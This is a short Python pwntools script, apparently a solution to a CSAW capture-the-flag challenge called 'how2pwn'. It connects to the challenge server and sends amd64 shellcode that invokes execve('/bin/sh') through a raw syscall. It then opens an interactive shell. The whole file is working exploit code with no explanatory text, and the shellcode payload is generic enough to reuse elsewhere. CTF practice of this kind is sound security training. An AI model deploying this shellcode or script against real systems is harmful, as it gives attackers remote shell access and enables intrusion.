from pwn import *
# context.log_level='debug'
# p = process("./chal1")
# p = remote("0.0.0.0", 60001)
p = remote("how2pwn.chal.csaw.io",60001)
v1 = 0x3b
v2 = hex(u64("/bin/sh\0"))
context.arch = 'amd64'
shellcode = f'''
xor rax, rax
xor rdi, rdi
xor rsi, rsi
xor rdx, rdx
mov rax, {v1}
mov rdi, {v2}
push rdi
mov rdi, rsp
syscall 
'''
p.sendlineafter(": \n",asm(shellcode).ljust(0x100,b'\0'))
p.interactive()
